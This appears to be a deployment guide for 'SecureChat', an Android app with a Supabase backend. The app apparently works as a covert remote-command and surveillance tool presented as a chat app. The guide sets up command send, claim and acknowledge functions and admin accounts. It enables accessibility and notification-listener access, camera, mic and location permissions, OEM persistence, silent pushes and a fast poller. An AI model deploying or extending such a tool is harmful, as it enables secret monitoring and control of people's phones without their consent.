# SecureChat Deployment Guide

## 1. Supabase
1. Create a new Supabase project.
2. Run the migration:
   ```bash
   supabase db push
   # or paste supabase/migrations/20241113000000_init.sql into the SQL editor
   ```
3. Create a storage bucket named `securechat` (public or authenticated as needed).

## 2. Edge Functions
Deploy the four functions:
```bash
supabase functions deploy send-command
supabase functions deploy claim-command
supabase functions deploy ack-command
supabase functions deploy send-chat-push
```

Set secrets:
```bash
supabase secrets set SUPABASE_SERVICE_ROLE_KEY=...
supabase secrets set FIREBASE_SERVICE_ACCOUNT_JSON='{...}'
supabase secrets set FCM_PROJECT_ID=your-project-id
# Optional helper while implementing full JWT flow:
supabase secrets set FCM_ACCESS_TOKEN=...
```

## 3. Android
1. Place `google-services.json` in `app/`.
2. Edit `app/build.gradle.kts` BuildConfig fields:
   - `SUPABASE_URL`
   - `SUPABASE_ANON_KEY`
   - Cloudinary values (optional)
3. Build:
   ```bash
   ./gradlew assembleDebug
   ```

## 4. Mark a user as admin
```sql
UPDATE public.profiles SET is_admin = true WHERE username = 'your_admin_username';
-- or by id:
UPDATE public.profiles SET is_admin = true WHERE id = 'uuid-here';
```

## 5. Permissions on device
- Accessibility Service → enable for SecureChat
- Notification Listener → enable
- Camera / Mic / Location / Storage as needed
- Battery optimization exemption
- OEM autostart (Xiaomi/Huawei/Oppo/Vivo/Samsung) via OemPersistenceHelper deep-links

## Notes
- Command path is **plain** (no Stage-2, no ECDH, no command encryption).
- Silent FCM data-only + 5 s poller fallback both active.
- Every failure returns structured `error_code` + `error_detail` visible in admin.
